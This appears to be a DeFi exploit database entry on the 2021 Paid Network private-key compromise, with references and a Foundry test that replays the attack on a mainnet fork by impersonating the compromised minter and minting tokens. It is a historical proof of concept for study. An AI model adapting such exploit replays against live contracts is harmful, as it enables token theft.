# [?] Paid Network - Private key compromised

## Summary
Severity: Unknown
Chain: Ethereum
Component: PAID
Published: 2021-03-05
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-03/PAID_exp.sol
Type: defi-exploit-poc

## Details
References:
- https://paidnetwork.medium.com/paid-network-attack-postmortem-march-7-2021-9e4c0fef0e07
- https://etherscan.io/tx/0x4bb10927ea7afc2336033574b74ebd6f73ef35ac0db1bb96229627c9d77555a0

```solidity
contract ContractTest is Test {
    // FakeToken FakeTokenContract;
    IPaid PAID = IPaid(0x8c8687fC965593DFb2F0b4EAeFD55E9D8df348df);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 11_979_839); // Fork mainnet at block 11979839
    }

    function testExploit() public {
        cheats.prank(0x18738290AF1Aaf96f0AcfA945C9C31aB21cd65bE);
        PAID.mint(address(this), 59_471_745_571_000_000_000_000_000); //key compromised or rugged
        emit log_named_decimal_uint("[End] PAID balance after exploitation:", PAID.balanceOf(address(this)), 18);
    }

    receive() external payable {}
}
```
